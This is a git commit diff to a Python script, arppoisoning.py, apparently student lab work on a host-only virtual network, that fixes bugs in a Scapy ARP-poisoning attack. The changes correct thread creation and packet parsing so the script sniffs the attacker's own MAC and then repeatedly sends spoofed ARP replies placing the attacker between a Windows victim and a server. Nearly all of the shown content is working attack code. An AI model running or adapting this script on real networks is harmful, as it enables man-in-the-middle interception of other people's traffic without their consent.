3d75a650366adccf9f28013a6599cc21ce047465
davnistor <d.oaida@student.tue.nl>
2023-05-26 22:48:47 +0200

    Fixed code.

--- arppoisoning.py
+++ arppoisoning.py
@@ -5,10 +5,6 @@ import threading
 #icmp to capture
 global icmp_packet_global
 
-# #attacker
-# global macAttacker = "08:00:27:d0:25:4b"
-# global ipAttacker = "192.168.56.103"
-
 #victim1
 macWindows = "08:00:27:b7:c4:af"
 ipWindows = "192.168.56.101"
@@ -19,12 +15,9 @@ ipServer = "192.168.56.102"
 
 #find the mac and ip of the current device
 def find_mac_ip(packet):
-    global macAttacker
-    global ipAttacker
-
-    if packet.haslayer(Ether) and packet.haslayer(IP):
+    if packet[0].haslayer(Ether):
         macc = packet[Ether].src
-        ipp = packet[IP].src
+        ipp = packet[ARP].psrc
 
         return [macc, ipp]
 
@@ -49,7 +42,8 @@ def sniff_icmp():
     global icmp_packet_global
 
     pkt = sniff(count=1, filter="arp")
-    icmp_packet_global = pkt[0]
+    if len(pkt) > 0:
+        icmp_packet_global = pkt[0]
 
 #refresh arp tables in case victim updates itself
 def maintain_arp_poison(arp1, arp2):
@@ -59,7 +53,8 @@ def maintain_arp_poison(arp1, arp2):
         time.sleep(60)
 
 if __name__ == "__main__":
-    thread_sniff = threading.Thread(sniff_icmp())
+    thread_sniff = threading.Thread(target=sniff_icmp)
+    thread_sniff.start()
     send_ping()
     the_ar = find_mac_ip(icmp_packet_global)
     macAttacker = the_ar[0]
@@ -67,5 +62,5 @@ if __name__ == "__main__":
 
     arp1 = create_pack(macAttacker, ipServer, ipWindows)
     arp2 = create_pack(macAttacker, ipWindows, ipServer)
-    thread_arp_poison = threading.Thread(target=maintain_arp_poison(arp1, arp2))
+    thread_arp_poison = threading.Thread(target=maintain_arp_poison, args=(arp1, arp2))
     thread_arp_poison.start()
